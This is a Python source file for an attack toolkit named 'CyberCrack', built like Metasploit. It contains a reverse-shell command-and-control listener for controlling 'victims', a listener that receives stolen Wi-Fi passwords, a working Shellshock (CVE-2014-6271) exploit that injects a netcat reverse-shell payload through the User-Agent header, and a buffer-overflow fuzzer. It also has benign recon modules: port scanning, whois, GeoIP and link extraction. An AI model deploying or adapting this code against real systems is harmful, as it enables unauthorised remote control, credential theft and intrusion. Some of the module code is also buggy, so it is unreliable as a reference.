from colorama import *
init()
import socket
import time
import base64
from pprint import pprint
from ipwhois import IPWhois
from netaddr import *
red = Fore.RED
reset = Fore.RESET
class cybercrack:
        class payloads:
            def __init__(self):
                junk = "Get"
            def windows_cybershell_rev_tcp(self):
                def options():
                    self = "bye"
                    print(r"""
                      Options                      Usage                   optional/neccesary
                :   LHOST                 | LHOST (yourip)           |          neccesary
                :   LPORT                 | LPORT (Listner port)     |          neccesary
                :   exploit/run           | exploit or run           |          neccesary 
                :   ExitOnSession         | ExitOnSession True/False |          neccesary
                :   Main()                | Main() exit this module  |          optional
        
                    """)

                def CyberShel():
                    print(r"""
                       Command                     Usage                                                special/not
                :   Download       | Download a file from target |                                    Special
                :   Upload         | Upload a file from ur machine to target|                         Special
                :   Shutdown       | Shutdown the target system (CyberShell will also die) |          Special
                :   Restart        | Restart the target system (CyberShell will also die)  |          Special
                :   Exit.session   | Exit the session |                                               Not
                :   ChangeDir      | Change the current directory to the directory of your choice |   Special
                :   Session.help   | Show help message |                                              Not
                :   PublicIp       | Show the public ip of the target |                               Special
                :   SysInfo        | Show all the info about the target system |                      Special
                    """)

                while True:
                    try:
                        CybershellInput = input("CyberCrack: windows/CyberShell/rev_tcp > ")
                        lhoststr = "LHOST "
                        lportstr = "LPORT "
                        if CybershellInput == "Options.module" or CybershellInput == "options.module":
                            options()
                        elif CybershellInput == "Options.session" or CybershellInput == "options.session":
                            CyberShel()
                        elif lhoststr in CybershellInput:
                            ipforshell = CybershellInput.replace(lhoststr, '')
                            LHOST = str(ipforshell)
                            print("LHOST = " + LHOST)
                        elif lportstr in CybershellInput:
                            portforshell = CybershellInput.replace(lportstr, '')
                            LPORT = int(portforshell)
                            print("LPORT = " + str(LPORT))
                        elif CybershellInput == "Sys.crash":
                            print("hello")
                        elif CybershellInput == "Main()":
                            break

                        elif CybershellInput == "Exploit" or CybershellInput == "run" or CybershellInput == "exploit":
                            try:
                                while True:
                                    try:
                                        import socket
                                        import pickle
                                        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                                        listener.bind((LHOST, LPORT))
                                        listener.listen(0)
                                        print(Fore.BLUE + "[+] " + Fore.RESET + "Started to listen on " + LHOST + ":" + str(
                                            LPORT))
                                        connection, addr = listener.accept()
                                        print(Fore.BLUE + "[+] " + Fore.RESET + "Victim connected")

                                        def write_file(path, content):
                                            with open(path, "wb") as file:
                                                file.write(content)
                                                print("[+] Download Successful")

                                        def read_file(file):
                                            with open(file, "rb") as to_upload:
                                                content = to_upload.read()
                                            connection.send(content)


                                        def reliable_recv():
                                            result = connection.recv(1048576)
                                            result = result.decode()
                                            print(result)

                                        def reliable_send(data):
                                            command = data.encode()
                                            connection.send(command)

                                        try:
                                            while True:
                                                command = input("CyberShell > ")
                                                if command == "Session.help":
                                                    CyberShel()
                                                elif "Download " in command:
                                                    name = command.replace("Download ", "")
                                                    reliable_send(data=command)
                                                    result = connection.recv(1048576)
                                                    content = result
                                                    write_file(name, content=content)
                                                elif "Upload " in command:
                                                    file = command.replace("Upload ", "")
                                                    reliable_send(data=command)
                                                    read_file(file=file)
                                                    message = connection.recv(1024)
                                                    print(message.decode())
                                                elif command == "":
                                                    continue
                                                else:
                                                    reliable_send(data=command)
                                                    reliable_recv()
                                        except KeyboardInterrupt:
                                            quit()
                                    except KeyboardInterrupt:
                                        print(Fore.RED)
                                        print("KeyBoardInterrupt")
                                        print(Fore.RESET)
                                        quit()
                            except socket.error as error:
                                print(red)
                                print("A session couldn't be made because the following reason ")
                                print("Try Giving a correct, available ip and port for the listner to work")
                                print("The error is the following")
                                print(error)
                                print(reset)
                                pass

                        else:
                            print(red)
                            print("Invalid Syntax")
                            print(reset)
                    except KeyboardInterrupt:
                        break
                    except UnboundLocalError:
                        print("[+] Assign required fields. type module.help for more info")

            def Cybercrack_wifi_password(self):
                while True:
                    user_in = input("CyberCrack: CyberCrack/wifi/password > ")
                    if user_in == "show options":
                        def options():
                            print(r"""
        : LHOST                  your ip address
        : LPORT                  any port you set up in the payload
        : run or exploit         run the script
                            """)
                            return  ""
                    elif "LHOST " in user_in:
                        ip = user_in.replace("LHOST ", "")
                        print("LHOST = " + str(ip))
                    elif "LPORT " in user_in:
                        port = user_in.replace("LPORT ", "")
                        print("LPORT = " + str(port))
                    elif user_in == "run" or user_in == "exploit":
                        try:
                            import socket
                            import time
                            green = Fore.LIGHTGREEN_EX
                            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                            server.bind((str(ip), int(port)))
                            server.listen(0)
                            print("[+] Listening for encoming connections ")
                            client, addr = server.accept()
                            print("[+] One CyberSession opened.")
                            print("[+] Victim connected. Please wait three seconds")
                            time.sleep(3)
                            data = client.recv(1048576)
                            data = data.decode()
                            print(green + data)
                            try:
                                while True:
                                    command = input("The profile you want the password > ")
                                    client.send(command.encode())
                                    password = client.recv(1048576)
                                    print(green + password.decode())
                            except KeyboardInterrupt:
                                quit()
                            except ConnectionResetError:
                                print("[+] The connection was closed by the target host")
                                quit()
                        except NameError:
                            print("[+] Assign all parameters related to this payload")
                    elif user_in == "help" or user_in == "show options":
                        print(r"""
        : LHOST                             your ip address
        : LPORT                             the port to listen on
        : run or exploit                    run the script         
                        """)
                    else:
                        print(red + "Invalid Syntax" + reset)
        class modules:
            class exploits:
                def shellshock(self):
                    import http.client
                    import urllib
                    def shock(uri, host, port, remote):
                        print("Attempting to exploit CVE-2014-6271 on %s" % (host))
                        print("We will attempt to connect back to %s %s" % (remote, port))
                        conn = http.client.HTTPConnection(host)
                        reverse_shell = "() { ignored;};/bin/bash -c '/bin/rm -f /tmp/f; /usr/bin/mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l %s %s > /tmp/f'" % (remote, port)

                        print("We will use the following shell: " + reverse_shell)
                        headers = {"Content-type": "application/x-www-form-urlencoded",
                                  "User-Agent": reverse_shell}
                        conn.request("GET", uri, headers=headers)
                        res = conn.getresponse()
                        print(res.status, res.reason)
                        data = res.read()
                        print(data)
                    def cmd():
                        while True:
                            try:
                                user_in = input("CyberCrack: Cybercrack/exploits/shellshock > ")
                                if user_in == "help" or user_in == "show options":
                                    print(r"""
: set URI               target uri
: set LHOST             the host to connect back to
: set LPORT             the port to listen on
: set T_IP              target ip
                                    """)
                                elif user_in.startswith("set"):
                                    if user_in.split()[1] == "URI":
                                        print("URI = " + str(user_in[2]))
                                        URI = user_in[2]
                                    elif user_in.split()[1] == "LHOST":
                                        LHOST = user_in[2]
                                        print("LHOST = " + LHOST)
                                    elif user_in.split()[1] == "LPORT":
                                        LPORT = user_in.split()[2]
                                        print("LPORT = " + str(LPORT))
                                    elif user_in.split()[1] == "T_IP":
                                        T_IP = user_in.split()[2]
                                        print("T_IP = " + str(T_IP))
                                    else:
                                        print("[+] Invalid parameter for set")
                                elif user_in == "run" or user_in == "exploit":
                                    shock(uri=URI, host=LHOST, port=LPORT, remote=T_IP)
                            except KeyboardInterrupt:
                                quit()
                            except NameError:
                                print("Assign all values related to this exploit")
                    cmd()
                def Fuzzer(self):
                    def Fuzzer_Help():
                        print(r"""
                        : THOST       | Target Ip |                            Necessary 
                        : TPORT       | Target Port |                          Necessary 
                        : SLEEP       | Time for the program to sleep |        Necessary
                        : JUNK_LENGTH | Data size send to the server |         Necessary
                        : Main()      | Return to main shell |                 Optional
                         """)

                    while True:
                        try:
                            Fuzzer_command = input("\nCyberCrack: CyberCrack/exploits/fuzzer > ")
                            if Fuzzer_command == "Help" or Fuzzer_command == "help":
                                Fuzzer_Help()
                            elif "THOST " in Fuzzer_command:
                                target_ip = Fuzzer_command.replace("THOST ", "")
                                print("THOST = " + str(target_ip))
                            elif "TPORT " in Fuzzer_command:
                                target_port = Fuzzer_command.replace("TPORT ", "")
                                print("TPORT = " + str(target_port))
                            elif "SLEEP " in Fuzzer_command:
                                sleep = Fuzzer_command.replace("SLEEP ", "")
                                print("SLEEP = " + str(sleep))
                            elif "JUNK_LENGTH " in Fuzzer_command:
                                lenght = Fuzzer_command.replace("JUNK_LENGTH ", "")
                                print("JUNK_LENGTH = " + str(lenght))
                            elif Fuzzer_command == "show options":
                                print(r"""
                                                : JUNK_LENGTH 'buffer size'
                                                : SLEEP 'time to rest'
                                                : TPORT 'target port'
                                                : THOST 'target host'
                                                """)
                            elif Fuzzer_command == "Main()" or Fuzzer_command == "main()":
                                break
                            elif Fuzzer_command == "Exploit" or Fuzzer_command == "run":
                                try:
                                    buff_size = int(lenght)
                                    check = int(lenght)
                                    while True:
                                        try:
                                            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                            conn.connect((target_ip, int(target_port)))
                                            junk = "A" * buff_size
                                            payload = "GET" + junk + "HTTP/1.1\r\n\r\n"
                                            conn.send(payload.encode("raw_unicode_escape"))
                                            buff_size += int(lenght)
                                            print("\r[+] Payload sent. " + str(buff_size) + " data sent", end="")
                                            conn.close()
                                            time.sleep(int(sleep))
                                        except WindowsError:
                                            if buff_size == check:
                                                print("\r[+] Check the ip, port or if the server is down because an error occured", end="")
                                                break
                                            else:
                                                print("\r[+] An overflow might occured at  " + str(buff_size), end="")
                                                break
                                except NameError:
                                    print(red + "Assign all values related to this exploit" + reset)
                                except KeyboardInterrupt:
                                    break
                            else:
                                print(red + "Invalid Syntax" + reset)
                        except NameError:
                            print(red + "Set all parameters type show options for more info" + reset)
            class CyberServe:
                def CyberServe_scanner_ports(self):
                   while True:
                       try:
                           PortScannerInput = input("CyberCrack: CyberServe/scanner/tcp_ports > ")
                           if "set THOST " in PortScannerInput:
                               ip_2 = PortScannerInput.replace("set THOST ", "")
                               print("THOST = " + str(ip_2))


                           elif PortScannerInput == "show options" or PortScannerInput == "Show options":
                               def options():
                                   print(r"""
                                  USAGE                         example
                           : set THOST 'targetip'     example 'set LHOST 192.168.1.4'
                           : set SCAN_TILL            the port you wamt to scan till
                           : run or exploit           example 'run'
                                                     """)
                                   return ""
                               options()
                           elif PortScannerInput.startswith("set") and PortScannerInput.split()[1] == "SCAN_TILL":
                               port_till = PortScannerInput.split()[2]
                               print("SCAN_TILL = " + str(port_till))
                           elif PortScannerInput == "run" or PortScannerInput == "exploit":
                               try:
                                   host = ip_2
                                   RESET = reset
                                   GRAY = Fore.LIGHTBLACK_EX
                                   GREEN = Fore.GREEN
                                   def is_port_open(host, port):
                                       s = socket.socket()
                                       try:
                                           s.connect((host, port))
                                       except:
                                           return False
                                       else:
                                           return True

                                   for port in range(1, int(port_till)):
                                       if is_port_open(host, port):
                                           print(f"{GREEN}[+] {host}:{port} is open      {RESET}")
                                       else:
                                           print(f"{GRAY}[!] {host}:{port} is closed    {RESET}", end="\r")
                               except KeyboardInterrupt:
                                   print("\n Exitting Program !!!!")
                                   break
                               except socket.gaierror:
                                   print("\n Hostname Could Not Be Resolved !!!!")
                                   quit()
                               except socket.error:
                                   print("\ Server not responding !!!!")
                                   quit()
                           else:
                               print(red + "Invalid Syntax" + reset)
                       except NameError:
                           print(red + "Assign all values and parameters" + reset)
                def Cyberserve_info_subnet_lookup(self):
                    def help():
                        print(r"""
: set THOST           target ip to be tested
: set NET             the network with the CIDR
: run or exploit  run the script
                        """)
                        return ""
                    def net(ip, net):
                        if IPAddress(ip) in IPNetwork(net):
                            print("[+] The ip " + str(ip) + " is in the network " + str(net))
                        else:
                            print("[+] The ip " + str(ip) + " is not in the network " + str(net))
                    while True:
                        try:
                            user_in = input("CyberCrack: Cyberserve/info/subnet_lookup > ")
                            if user_in == "help" or user_in == "show options":
                                help()
                            elif user_in.startswith("set"):
                                if user_in.split()[1] == "THOST":
                                    ip = user_in.split()[2]
                                    print("THOST = " + str(ip))
                                elif user_in.split()[1] == "NET":
                                    network = user_in.split()[2]
                                    print("NET = " + str(network))
                                else:
                                    print("Invalid parameter for set")
                            elif user_in == "run" or user_in == "exploit":
                                net(ip=ip, net=network)
                        except NameError:
                            print("[+] Assign all values related to this module")
                def Cyberserve_info_whois_lookup(self):
                    def help():
                        print(r"""
: set THOST                         Type the target ip address
: run or exploit                    run the script
: Main()                            return to the main shell
                                    as simple as that
                        """)
                        return ""


                    def whois_look(ip):
                        domain = IPWhois(ip)
                        result = domain.lookup_whois()
                        pprint(result)
                    while True:
                        input_user = input("CyberCrack: CyberServe/information/whois_lookup > ")
                        if input_user == "help" or input_user == "show options":
                            help()
                        elif input_user.startswith("set"):
                            parameter = input_user.split()[1]
                            if parameter == "THOST":
                                ip_addr = input_user.split()[2]
                                print("THOST = " + str(ip_addr))
                            else:
                                print("[+] Invalid parameter for set")
                        elif input_user == "run" or input_user == "exploit":
                            try:
                                print("[+] This operation may take a few minutes")
                                whois_look(ip=ip_addr)
                            except NameError:
                                print("[+] Assign all parameters related to this module")
                        elif input_user == "Main()":
                            break
                        elif input_user == "":
                            continue
                        else:
                            print("[+] Invalid syntax")
                def CyberServe_info_extract_weblinks(self):
                    import requests
                    from urllib.parse import urlparse, urljoin
                    from bs4 import BeautifulSoup
                    GREEN = Fore.GREEN
                    GRAY = Fore.LIGHTBLACK_EX
                    RESET = reset
                    import re


                    def crawl(url):
                        url = url
                        reqs = requests.get(url)
                        soup = BeautifulSoup(reqs.text, 'html.parser')

                        urls = []
                        for link in soup.find_all('a'):
                            print(link.get('href'))
                    def help():
                        print(r"""
: set URL                 the target ip
: run or exploit          run the script
                        """)
                    while True:
                        try:
                            user_in = input("CyberCrack: CyberServe/info/extract_web_links > ")
                            if user_in == "help" or user_in == "show options":
                                help()
                            elif user_in.startswith("set"):
                                ip = user_in.split()[2]
                                if user_in.split()[1] == "URL":
                                    print("URL = " + str(ip))
                                else:
                                    print("[+] Invalid parameter for set")
                            elif user_in == "run" or user_in == "exploit":
                                crawl(url=ip)
                            else:
                                print("[+] Invalid command")
                        except NameError as e:
                            print("[+] Assign all parameters related to this module ")
                            print(e)
                        except requests.exceptions.InvalidSchema:
                            print("[+] Invalid URL")
                        except requests.exceptions.MissingSchema:
                            print("[+] Inculde https:// or http:// in the url")
                def CyberServe_info_geoip(self):
                    def geoip(ip):
                        from geoip import geolite2
                        match = geolite2.lookup(ip)
                        print("Ip address - " + match.ip)
                        print("Country - " + match.country)
                        print("Continent - " + match.continent)
                        print("Timezone - " + match.timezone)
                        print("Location - " + str(match.location))

                    while True:
                        try:
                            user_in = input("CyberCrack: CyberServe/info/geoip > ")
                            if user_in == "help" or user_in == "show options":
                                print(r"""
                            : set THOST              The target ip address
                            : run                    run the script
                                                        """)
                            elif user_in.startswith("set") and user_in.split()[1] == "THOST":
                                ip = user_in.split()[2]
                                print("THOST = " + str(ip))
                            elif user_in == "run" or user_in == "exploit":
                                geoip(ip=ip)
                            else:
                                print("[+] Invalid command")
                        except NameError:
                            print("[+] Assign al values related to this exploit")







